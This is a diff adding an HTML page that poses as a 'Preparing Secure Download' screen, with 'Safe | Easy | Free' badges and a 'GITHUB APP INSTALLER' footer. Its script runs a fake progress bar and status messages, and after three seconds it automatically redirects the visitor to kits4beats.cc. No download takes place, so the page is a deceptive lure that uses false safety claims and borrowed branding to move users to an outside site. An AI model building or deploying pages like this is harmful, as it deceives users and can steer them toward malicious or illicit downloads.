@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Preparing Secure Download</title>
+<meta name="description" content="Preparing your destination.">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    min-height: 100vh;
+    font-family: Arial, Helvetica, sans-serif;
+    background: linear-gradient(125deg, #1b2347, #172e55);
+    color: #f7f7ff;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 0 18px 45px;
+}
+
+.wrapper {
+    width: 100%;
+    max-width: 550px;
+}
+
+.topbar {
+    width: fit-content;
+    max-width: 100%;
+    margin: 0 auto 18px;
+    padding: 6px 12px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 15px;
+    background: #1c2035;
+    border: 1px solid #343750;
+    border-radius: 18px;
+    flex-wrap: wrap;
+}
+
+.info {
+    padding: 11px 20px;
+    background: #302e5c;
+    border: 1px solid #514bb1;
+    border-radius: 13px;
+    font-size: 15px;
+}
+
+.safe {
+    padding: 12px 20px;
+    background: #08b681;
+    border-radius: 30px;
+    color: white;
+    font-size: 15px;
+    font-weight: bold;
+}
+
+.card {
+    background: #1e2032;
+    border: 1px solid #34364c;
+    border-radius: 30px;
+    overflow: hidden;
+    text-align: center;
+    box-shadow: 0 20px 65px #080e2430;
+}
+
+.content {
+    padding: 49px 30px 38px;
+}
+
+.download-icon {
+    width: 102px;
+    height: 102px;
+    background: #5750ec;
+    border-radius: 26px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 0 auto 33px;
+}
+
+.download-icon svg {
+    width: 66px;
+    height: 66px;
+    stroke: white;
+    stroke-width: 2.5;
+    fill: none;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+}
+
+h1 {
+    font-size: clamp(25px, 5vw, 34px);
+    font-weight: 800;
+    margin-bottom: 14px;
+    letter-spacing: -.7px;
+}
+
+.subtitle {
+    font-size: 18px;
+    font-weight: 600;
+    color: #d0d0dc;
+}
+
+.progress-area {
+    margin-top: 40px;
+}
+
+.progress-track {
+    width: 100%;
+    height: 10px;
+    background: #34364d;
+    border-radius: 30px;
+    overflow: hidden;
+}
+
+.progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #5148e8, #7165ff);
+    border-radius: 30px;
+}
+
+.status {
+    margin-top: 34px;
+    font-size: 19px;
+    font-weight: 700;
+}
+
+.features {
+    margin-top: 80px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 28px;
+}
+
+.feature {
+    font-size: 16px;
+    font-weight: 700;
+    color: #c9cbd7;
+    white-space: nowrap;
+}
+
+.feature span {
+    color: #08d7a1;
+    margin-right: 10px;
+}
+
+.manual {
+    display: inline-block;
+    margin-top: 24px;
+    color: #aaa9ff;
+    font-size: 14px;
+    text-decoration: none;
+}
+
+.manual:hover {
+    color: white;
+    text-decoration: underline;
+}
+
+.footer {
+    background: #171b2b;
+    padding: 24px 12px;
+    color: #74798c;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: .7px;
+}
+
+@media(max-width: 480px) {
+    .content {
+        padding: 38px 20px 32px;
+    }
+
+    .features {
+        margin-top: 55px;
+        gap: 20px;
+    }
+
+    .feature {
+        font-size: 13px;
+    }
+
+    .topbar {
+        gap: 8px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+    <div class="topbar">
+        <div class="info">Information about file</div>
+        <div class="safe">♧ &nbsp; Safe | Easy | Free</div>
+    </div>
+
+    <main class="card">
+
+        <div class="content">
+
+            <div class="download-icon">
+                <svg viewBox="0 0 64 64">
+                    <path d="M32 7v35"></path>
+                    <path d="M16 26l16 16 16-16"></path>
+                    <path d="M8 43v10a5 5 0 005 5h38a5 5 0 005-5V43"></path>
+                </svg>
+            </div>
+
+            <h1>Preparing Secure Download</h1>
+
+            <p class="subtitle" id="subtitle">
+                Establishing connection...
+            </p>
+
+            <div class="progress-area">
+                <div class="progress-track">
+                    <div class="progress-bar" id="progress"></div>
+                </div>
+            </div>
+
+            <p class="status" id="status">
+                Download starting...
+            </p>
+
+            <div class="features">
+                <div class="feature">
+                    <span>✓</span> Direct Access
+                </div>
+
+                <div class="feature">
+                    <span>✓</span> Easy Navigation
+                </div>
+
+                <div class="feature">
+                    <span>✓</span> High Speed
+                </div>
+            </div>
+
+            <a href="https://kits4beats.cc/" class="manual" id="continue">
+                Continue manually →
+            </a>
+
+        </div>
+
+        <footer class="footer">
+            POWERED BY GITHUB APP INSTALLER
+        </footer>
+
+    </main>
+
+</div>
+
+<script>
+(function () {
+
+    "use strict";
+
+    // Direct destination URL (No Base64)
+    const destination = "https://kits4beats.cc/";
+
+    const progress = document.getElementById("progress");
+    const status = document.getElementById("status");
+    const subtitle = document.getElementById("subtitle");
+    const continueButton = document.getElementById("continue");
+
+    let redirected = false;
+
+    // Manual redirect
+    continueButton.addEventListener("click", function (event) {
+        event.preventDefault();
+
+        if (!redirected) {
+            redirected = true;
+            window.location.assign(destination);
+        }
+    });
+
+    // Progress animation
+    let percentage = 0;
+
+    const progressInterval = setInterval(function () {
+
+        percentage += Math.floor(Math.random() * 7) + 3;
+
+        if (percentage >= 100) {
+            percentage = 100;
+            clearInterval(progressInterval);
+        }
+
+        progress.style.width = percentage + "%";
+
+    }, 100);
+
+    // Status messages
+    setTimeout(function () {
+        subtitle.textContent = "Preparing your destination...";
+        status.textContent = "Checking connection...";
+    }, 800);
+
+    setTimeout(function () {
+        subtitle.textContent = "Connection prepared...";
+        status.textContent = "Redirecting shortly...";
+    }, 1700);
+
+    // Automatic redirect
+    setTimeout(function () {
+
+        if (!redirected) {
+            redirected = true;
+            window.location.replace(destination);
+        }
+
+    }, 3000);
+
+})();
+</script>
+
+</body>
+</html>
